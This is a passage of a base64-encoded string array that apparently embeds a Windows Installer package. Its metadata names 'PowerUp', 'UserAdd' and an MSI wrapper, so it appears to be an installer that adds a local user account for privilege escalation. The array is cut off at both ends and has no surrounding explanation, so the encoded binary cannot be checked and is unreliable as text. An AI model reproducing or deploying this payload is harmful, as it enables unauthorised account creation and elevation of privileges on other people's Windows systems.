AAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAP','3////+/////v//','/y8AAAAFAAAABg','AAAP7///8IAAAA','CQAAAAoAAAALAA','AADAAAAA0AAAAO','AAAADwAAABAAAA','ARAAAAEgAAABMA','AAAUAAAAFQAAAC','wAAAAYAAAAFgAA','ABkAAAAaAAAAGw','AAABwAAAAdAAAA','HgAAAB8AAAAgAA','AAIQAAACIAAAAj','AAAAJAAAACUAAA','AmAAAAJwAAACgA','AAApAAAAKgAAAC','sAAAD+////LQAA','AC4AAAAwAAAA/v','///zEAAAD+////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','9SAG8AbwB0ACAA','RQBuAHQAcgB5AA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAFgAFAP//////','////AgAAAIQQDA','AAAAAAwAAAAAAA','AEYAAAAAAAAAAA','AAAABQSJaT62LP','AQMAAABAFwAAAA','AAAAUAUwB1AG0A','bQBhAHIAeQBJAG','4AZgBvAHIAbQBh','AHQAaQBvAG4AAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAoAAIBEAAA','ABkAAAD/////AA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAANgBAA','AAAAAAQEj/P+RD','7EHkRaxEMUgAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAABAAAgEV','AAAAAwAAAP////','8AAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAJAAAAEA','gAAAAAAABASMpB','MEOxOztCJkY3Qh','xCNEZoRCZCAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAGAAC','AQQAAAABAAAA//','///wAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAACoAAA','AwAAAAAAAAAEBI','ykEwQ7E/Ej8oRT','hCsUEoSAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAU','AAIBEgAAAA0AAA','D/////AAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAKw','AAABgAAAAAAAAA','QEjKQflFzkaoQf','hFKD8oRThCsUEo','SAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','ABgAAgH///////','////////8AAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AsAAAAKgAAAAAA','AABASAtDMUE1Rw','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAACgACARMAAA','AWAAAA/////wAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAFkAAAAIAAAA','AAAAAEBIfz9kQS','9CNkgAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAMAAIBBg','AAAAwAAAD/////','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAWgAAACYA','AAAAAAAAC0MxQT','VHfkG9RwxG9kUy','RIpBN0NyRM1DL0','gAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAABwAAg','H/////DwAAAP//','//8AAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAXAAAA','AFgBAAAAAABASI','xE8ERyRGhEN0gA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAADg','ACAP//////////','/////wAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAC4A','AAAMAAAAAAAAAE','BIDEb2RTJEikE3','Q3JEAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AQAAIA////////','////////AAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','LwAAADwAAAAAAA','AAQEgNQzVC5kVy','RTxIAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAA4AAgEOAAAA','GAAAAP////8AAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAwAAAAEgAAAA','AAAABASA9C5EV4','RShIAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAADAACAP//','/////////////w','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAADEAAAAQAA','AAAAAAAEBID0Lk','RXhFKDsyRLNEMU','LxRTZIAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAWAAIB','/////xEAAAD///','//AAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAMgAAAA','QAAAAAAAAAQEhZ','RfJEaEU3RwAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAwA','AgEUAAAA//////','////8AAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAABXAA','AAWAAAAAAAAAAL','QzFBNUd+Qb1HYE','XkRDNCJz/oRfhE','WUWyQjVBMEgAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','IAACAP////////','///////wAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','cAAAAAOAEAAAAA','AEBIUkT2ReRDrz','s7QiZGN0IcQjRG','aEQmQgAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAaAAIABQAAAA','gAAAD/////AAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AANAAAAJYAAAAA','AAAAQEhSRPZF5E','OvPxI/KEU4QrFB','KEgAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAABYAAgD///','////////////8A','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAA3AAAAMAAA','AAAAAABASBVBeE','TmQoxE8UHsRaxE','MUgAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAFAACAQ','oAAAD/////////','/wAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAADgAAAAE','AAAAAAAAAEBIFk','InQyRIAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAKAA','IA////////////','////AAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAOQAA','AA4AAAAAAAAAQE','jeRGpF5EEoSAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','wAAgD/////////','//////8AAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAABW','AAAAIAAAAAAAAA','BASBtCKkP2RTVH','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AADAACAQcAAAAL','AAAA/////wAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','ADwAAAA8AAAAAA','AAAEBIPzvyQzhE','sUUAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAMAAIA////','////////////AA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAASwAAAKACAA','AAAAAAQEg/P3dF','bERqPrJEL0gAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAABAAAgD/','//////////////','8AAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAtAAAASA','QAAAAAAABASD8/','d0VsRGo75EUkSA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAEAAC','AQkAAAAXAAAA//','///wAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAQAAA','APIAAAAAAAAAUA','RABvAGMAdQBtAG','UAbgB0AFMAdQBt','AG0AYQByAHkASQ','BuAGYAbwByAG0A','YQB0AGkAbwBuAA','AAAAAAAAAAAAA4','AAIA//////////','//////AAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAWw','AAAIAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAH///////','////////8AAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','D+////BiEAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAP////','///////////wAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAA//','//////////////','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','D/////////////','//8AAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAP//////////','/////wAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAA////////','////////AAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAAQAAAAIAAAAD','AAAABAAAAAUAAA','AGAAAABwAAAP7/','////////CgAAAA','sAAAAMAAAADQAA','AA4AAAAPAAAAEA','AAABEAAAASAAAA','EwAAABQAAAAVAA','AAFgAAABcAAAAY','AAAAGQAAABoAAA','AbAAAAHAAAAB0A','AAAeAAAAHwAAAC','AAAAAhAAAAIgAA','ACMAAAAkAAAAJQ','AAACYAAAAnAAAA','KAAAACkAAAD+//','///v////7////+','////MwAAAP7///','/+/////v////7/','///+////OgAAAD','UAAAA2AAAA/v//','//7////+/////v','///zsAAAA9AAAA','/v///z4AAAA/AA','AAQAAAAEEAAABC','AAAAQwAAAEQAAA','BFAAAARgAAAEcA','AABIAAAASQAAAE','oAAAD+////TAAA','AE0AAABOAAAATw','AAAFAAAABRAAAA','UgAAAFMAAABUAA','AAVQAAAP7////+','////WAAAAP7///','/+/////v///1wA','AAD+//////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','//////////////','////7/AAAGAQIA','AAAAAAAAAAAAAA','AAAAAAAAEAAADg','hZ/y+U9oEKuRCA','ArJ7PZMAAAAKgB','AAAOAAAAAQAAAH','gAAAACAAAAkAEA','AAMAAACAAQAABA','AAAHABAAAFAAAA','gAAAAAYAAAAoAQ','AABwAAAJQAAAAJ','AAAAqAAAAAwAAA','DYAAAADQAAAOQA','AAAOAAAA8AAAAA','8AAAD4AAAAEgAA','AAgBAAATAAAAAA','EAAAIAAADkBAAA','HgAAAAoAAABJbn','N0YWxsZXIAAAAe','AAAACwAAAEludG','VsOzEwMzMAAB4A','AAAnAAAAe0EwND','lFMzFGLTc3MDEt','NEM0QS1BQ0JDLU','IyNjBFQjA4QkI0','Q30AAEAAAAAALf','R1QTjPAUAAAAAA','LfR1QTjPAQMAAA','DIAAAAAwAAAAIA','AAADAAAAAgAAAB','4AAAAXAAAATVNJ','IFdyYXBwZXIgKD','QuMS41NC4wKQAA','HgAAAEAAAABJbn','N0YWxsZXIgd3Jh','cHBlZCBieSBNU0','kgV3JhcHBlciAo','NC4xLjU0LjApIG','Zyb20gd3d3LmV4','ZW1zaS5jb20AHg','AAAAgAAABQb3dl','clVwAB4AAAAIAA','AAVXNlckFkZAAe','AAAAEAAAAFVzZX','JBZGQgMS4wLjAu','MABBOM8BAwAAAM','gAAAADAAAAAgAA','AB4AAAArAAAAV2','luZG93cyBJbnN0','YWxsZXIgWE1MIF','Rvb2xzZXQgKDMu','OC4xMTI4LjApAA','ADAAAAAgAAAAAA','AAAAAAAAAAAAAA','AAAAAAAAAAAAAA','AAYABgAGAAYABg','AGAAYABgAGAAYA','CgAKACIAIgAiAC','kAKQApACoAKgAq','ACsAKwAvAC8ALw','AvAC8ALwA1ADUA','NQA9AD0APQA9AD','0ATQBNAE0ATQBN','AE0ATQBNAFwAXA','BhAGEAYQBhAGEA','YQBhAGEAbwBvAH','IAcgByAHMAcwBz','AHQAdAB3AHcAdw','B3AHcAdwCCAIIA','hgCGAIYAhgCGAI','YAkACQAJAAkACQ','AJAAkAACAAUACw','AMAA0ADgAPABAA','EQASAAcACQAjAC','UAJwAjACUAJwAj','ACUAJwABAC